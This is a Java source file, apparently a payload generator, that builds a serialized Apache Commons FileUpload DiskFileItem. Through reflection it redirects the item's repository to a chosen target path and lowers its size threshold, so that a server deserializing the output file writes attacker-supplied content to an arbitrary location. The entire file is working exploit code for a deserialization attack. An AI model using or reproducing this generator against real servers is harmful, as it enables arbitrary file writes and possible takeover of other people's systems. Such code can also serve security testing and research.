import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileItemFactory;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;

import java.io.*;
import java.lang.reflect.Field;

public class GenPayload {
    String filePathTarget;
    String filePathContent;

    DiskFileItem diskFileItem;

    public GenPayload() {
    }

    public GenPayload(String filePathTarget, String filePathContent) {
        this.filePathTarget = filePathTarget;
        this.filePathContent = filePathContent;

    }

    public String getFilePathTarget() {
        return filePathTarget;
    }

    public void setFilePathTarget(String filePathTarget) {
        this.filePathTarget = filePathTarget;
    }

    public String getFilePathContent() {
        return filePathContent;
    }

    public void setFilePathContent(String filePathContent) {
        this.filePathContent = filePathContent;
    }

    public DiskFileItem getDiskFileItem() {
        return diskFileItem;
    }

    public void setDiskFileItem(DiskFileItem diskFileItem) {
        this.diskFileItem = diskFileItem;
    }

    public void CreatePayload() throws IOException, NoSuchFieldException, IllegalAccessException {
        System.out.print("[*] Create payload: ");
        FileItemFactory fileItemFactory = new DiskFileItemFactory(this.filePathContent.length(), null);
        this.diskFileItem = (DiskFileItem) fileItemFactory.createItem("field1", "text/html", true, "temp.txt");

        OutputStream outputStream = diskFileItem.getOutputStream();
        outputStream.write(filePathContent.getBytes());
        outputStream.close();

        Class<? extends DiskFileItem> diskFileItemClass = diskFileItem.getClass();
        File nr = new File(filePathTarget);

        Field field = diskFileItemClass.getDeclaredField("repository");
        field.setAccessible(true);
        field.set(diskFileItem, nr);

        File repository = (File) field.get(diskFileItem);

        Field field1 = diskFileItemClass.getDeclaredField("sizeThreshold");
        field1.setAccessible(true);
        field1.setInt(diskFileItem, 1);
        System.out.println("Done");
        System.out.println("[*] Repository: " + repository);

    }

    public void Serialize(String fPathOut) throws IOException {
        System.out.print("[*] Serialize payload: ");
        FileOutputStream fileOutputStream;

        fileOutputStream = new FileOutputStream(fPathOut);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(diskFileItem);

        objectOutputStream.close();
        fileOutputStream.close();
        System.out.println("Done");
    }

}
